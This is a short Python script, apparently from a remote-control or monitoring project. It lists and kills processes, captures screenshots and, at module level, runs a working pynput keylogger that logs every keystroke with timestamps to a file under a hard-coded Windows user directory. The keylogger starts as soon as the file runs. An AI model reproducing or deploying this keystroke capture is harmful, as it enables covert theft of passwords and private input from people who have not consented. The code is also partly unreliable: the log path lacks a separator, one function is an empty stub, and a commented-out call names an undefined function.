import psutil
import pyautogui
import cv2
import numpy as np
import os
from pynput.keyboard import Listener
import logging

def get_process_running():
    application_running = []

    for proc in psutil.process_iter(['pid', 'name']):
        application_running.append(proc.info)

    return application_running


def kill_process_running(pid):
    p = psutil.Process(pid)
    p.kill()


def take_screen_shot():

    screen_shot = pyautogui.screenshot()
    screen_shot = cv2.cvtColor(np.array(screen_shot), cv2.COLOR_RGB2BGR)
    # screem_shot_file = open('screen_shot_1.png', 'w')
    # f = open(os.path.join(os.path.dirname(__file__), 'screen_shot_1.jpg'), 'w')
    cv2.imshow('screen_shot_1.png', screen_shot)
    cv2.waitKey(0)
    return screen_shot


def keylogger_listening():

    pass


for proc in psutil.process_iter(['pid', 'name']):
    print(proc)


log_dir = r"C:\Users\Windows 10\Desktop\SocketRemote\server"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
  logging.info(str(key))


with Listener(on_press=on_press) as listener:
  listener.join()
# for p in psutil.win_service_iter():
#     if
#     print(p)

# kill_application_running(17680)
# print(take_screen_shot())
